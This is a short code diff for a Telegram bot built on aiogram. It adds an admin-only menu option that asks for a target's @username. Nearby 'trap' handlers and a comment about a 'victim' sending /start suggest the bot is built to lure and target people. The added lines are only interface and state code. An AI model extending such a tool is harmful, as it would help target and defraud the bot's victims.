@@ -3503,6 +3503,26 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			# Запускаем в фоне чтобы не блокировать
 			asyncio.ensure_future(_trap_create(uid, username, _instance_token))
 
+		# ─── Username-метод ──────────────────────────────────────────────────────
+		elif d == "prem_username_method":
+			if uid not in admins:
+				await bot_instance.answer_callback_query(call.id, "❌ Только для администраторов!", show_alert=True)
+				return
+			if bot_off():
+				await bot_instance.edit_message_caption(call.message.chat.id, call.message.message_id,
+					caption=">❌ *Бот выключен\!*", parse_mode="MarkdownV2", reply_markup=panel_back_markup)
+				return
+			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitUsernamePremFSM.username.state)
+			await dp_instance.current_state(user=uid).update_data(_bot_token=_instance_token)
+			await bot_instance.edit_message_caption(
+				call.message.chat.id, call.message.message_id,
+				caption=(
+					"👤 *Username\-метод*\n\n"
+					"*└─ Введите @username цели:*"
+				),
+				parse_mode="MarkdownV2", reply_markup=panel_back_markup
+			)
+
 		# ─── Trap — подтверждение (жертва написала /start) ───────────────────────
 		elif d == "trap_done":
 			await call.answer()
